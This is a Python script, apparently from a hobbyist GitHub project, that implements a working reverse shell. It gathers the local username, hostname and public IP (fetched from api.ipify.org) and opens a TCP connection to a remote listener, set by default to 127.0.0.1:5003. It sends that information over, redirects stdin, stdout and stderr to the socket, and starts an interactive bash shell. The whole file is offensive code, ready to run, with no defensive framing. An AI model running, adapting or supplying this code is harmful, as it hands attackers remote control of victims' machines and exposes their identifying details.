#!/usr/bin/env python3

try:
    from subprocess import call
    from sys import exit
    from os import dup2
    import requests
    import socket
    import time
    import os

except ImportError:
    raise RuntimeError("Important modules are missing!")

# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyjeek                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Github  :   @Keyj33k                  #
#   Version :   1.0.7                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # #


class ReverseShell:

    def __init__(
            self,
            remote_username: str,
            remote_hostname: str,
            remote_ipv4_address: str,
            public_ipv4_address: str,
            remote_port: int
    ):
        self.remote_hostname = remote_hostname
        self.remote_username = remote_username
        self.public_ipv4_address = public_ipv4_address
        self.remote_ipv4_address = remote_ipv4_address
        self.remote_port = remote_port

    def shell(self):
        with socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
        ) as socket_sock:
            socket_sock.connect((
                self.remote_ipv4_address,
                self.remote_port
            ))

            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Connected to {self.public_ipv4_address}!".encode())
            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Start interacting with target ...".encode())

            time.sleep(1.75)

            socket_sock.send(
                f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected".encode() +
                f" to {self.remote_username}'s machine {self.remote_hostname} ".encode()
            )
            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ...".encode())

            time.sleep(1.75)

            dup2(
                socket_sock.fileno(),
                0
            )  # return stream integer file descriptor
            dup2(
                socket_sock.fileno(),
                1
            )  # used for request I/O actions from the OS
            dup2(
                socket_sock.fileno(),
                2
            )

            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Successfully ".encode() +
                f"started a reverse shell to {self.remote_username}'s machine!\n\n".encode())

            call([
                "/bin/bash",
                "-i"
            ])


if __name__ == "__main__":
    call(["clear"])

    while True:
        try:
            remote_connection = ReverseShell(
                os.getlogin(),
                socket.gethostname(),
                "127.0.0.1",
                requests.get('https://api.ipify.org').text,
                5003
            )

            remote_connection.shell()

        except ConnectionRefusedError:
            print("\033[0;37m[\033[0;33m-\033[0;37m] Connection failed: server may be offline?")

            for retry in str(input("Do you want to retry? y/n ")):
                if retry == 'y' or retry == 'Y':
                    pass

                elif retry == 'n' or retry == 'N':
                    exit(0)

                else:
                    print("\033[0;37m[\033[0;33m-\033[0;37m] Invalid Input!")

                    exit(1)
